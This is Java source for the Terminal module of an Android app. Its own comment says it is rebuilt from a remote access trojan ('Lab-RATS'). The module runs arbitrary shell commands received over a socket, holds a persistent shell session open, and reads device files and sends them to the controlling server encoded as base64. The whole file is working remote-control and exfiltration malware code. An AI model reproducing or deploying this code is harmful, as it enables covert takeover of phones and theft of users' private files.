package com.fason.app.features.terminal;

import android.util.Base64;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import io.socket.client.Socket;

/**
 * Terminal — remote shell execution (rebuilt from Lab-RATS TerminalModule).
 * Runs commands with the app's UID, streams stdout/stderr back over socket.
 * Supports: exec (one-shot), shell session (persistent), download (base64 file).
 */
public final class Terminal {
    private static volatile Terminal instance;
    private final ExecutorService exec = Executors.newCachedThreadPool();
    private volatile Process shellProcess;
    private volatile OutputStream shellStdin;
    private final AtomicBoolean shellRunning = new AtomicBoolean(false);

    private Terminal() {}

    public static synchronized Terminal getInstance() {
        if (instance == null) instance = new Terminal();
        return instance;
    }

    /** One-shot command. payload: {cmd, timeoutSec?} */
    public void exec(JSONObject payload, String cmdId) {
        String cmd = payload.optString("cmd", "");
        int timeout = payload.optInt("timeoutSec", 30);
        if (cmd.isEmpty()) { reply(cmdId, "", "empty command", 0, false); return; }
        exec.execute(() -> {
            Process p = null;
            try {
                p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                final Process fp = p;
                exec.execute(() -> {
                    try { fp.waitFor(timeout, TimeUnit.SECONDS); if (fp.isAlive()) fp.destroyForcibly(); }
                    catch (Exception ignored) {}
                });
                String out = readAll(p.getInputStream());
                String err = readAll(p.getErrorStream());
                int code = p.waitFor();
                reply(cmdId, out, err, code, true);
            } catch (Exception e) {
                reply(cmdId, "", e.getMessage(), -1, false);
            } finally {
                if (p != null) p.destroy();
            }
        });
    }

    /** Start persistent shell session. */
    public void startShell(String cmdId) {
        exec.execute(() -> {
            try {
                shellProcess = Runtime.getRuntime().exec(new String[]{"sh"});
                shellStdin = shellProcess.getOutputStream();
                shellRunning.set(true);
                streamShell(cmdId, shellProcess.getInputStream(), false);
                streamShell(cmdId, shellProcess.getErrorStream(), true);
                reply(cmdId, "", "shell started", 0, true);
            } catch (Exception e) {
                shellRunning.set(false);
                reply(cmdId, "", e.getMessage(), -1, false);
            }
        });
    }

    /** Write to persistent shell. */
    public void writeShell(String cmd, String cmdId) {
        exec.execute(() -> {
            try {
                if (shellStdin == null || !shellRunning.get()) {
                    reply(cmdId, "", "no active shell", -1, false);
                    return;
                }
                shellStdin.write((cmd + "\n").getBytes("UTF-8"));
                shellStdin.flush();
            } catch (Exception e) {
                shellRunning.set(false);
                reply(cmdId, "", e.getMessage(), -1, false);
            }
        });
    }

    public void stopShell(String cmdId) {
        exec.execute(() -> {
            try {
                if (shellProcess != null) shellProcess.destroyForcibly();
                shellRunning.set(false);
                reply(cmdId, "", "shell stopped", 0, true);
            } catch (Exception e) {
                reply(cmdId, "", e.getMessage(), -1, false);
            }
        });
    }

    /** Download file as base64. payload: {path} */
    public void download(JSONObject payload, String cmdId) {
        String path = payload.optString("path", "");
        exec.execute(() -> {
            try {
                java.io.File f = new java.io.File(path);
                if (!f.exists() || !f.isFile()) { reply(cmdId, "", "not found: " + path, -1, false); return; }
                if (f.length() > 20 * 1024 * 1024) { reply(cmdId, "", "file too large (>20MB)", -1, false); return; }
                byte[] buf = new byte[(int) f.length()];
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                int read = 0;
                while (read < buf.length) {
                    int n = fis.read(buf, read, buf.length - read);
                    if (n < 0) break;
                    read += n;
                }
                fis.close();
                JSONObject r = new JSONObject();
                r.put("cmdId", cmdId);
                r.put("success", true);
                r.put("path", path);
                r.put("size", read);
                r.put("data", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP));
                emit(r);
            } catch (Exception e) {
                reply(cmdId, "", e.getMessage(), -1, false);
            }
        });
    }

    private void streamShell(String cmdId, InputStream in, boolean isErr) {
        exec.execute(() -> {
            try {
                BufferedReader br = new BufferedReader(new InputStreamReader(in));
                String line;
                while (shellRunning.get() && (line = br.readLine()) != null) {
                    JSONObject r = new JSONObject();
                    r.put("cmdId", cmdId);
                    r.put("stream", isErr ? "stderr" : "stdout");
                    r.put("line", line);
                    emit(r);
                }
            } catch (Exception ignored) {}
        });
    }

    private String readAll(InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        return bos.toString("UTF-8");
    }

    private void reply(String cmdId, String out, String err, int code, boolean ok) {
        try {
            JSONObject r = new JSONObject();
            r.put("cmdId", cmdId);
            r.put("success", ok);
            r.put("stdout", out.length() > 8000 ? out.substring(0, 8000) : out);
            r.put("stderr", err.length() > 4000 ? err.substring(0, 4000) : err);
            r.put("exitCode", code);
            emit(r);
        } catch (Exception ignored) {}
    }

    private void emit(JSONObject o) {
        Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
        if (s != null) s.emit("0xTM", o);
    }
}
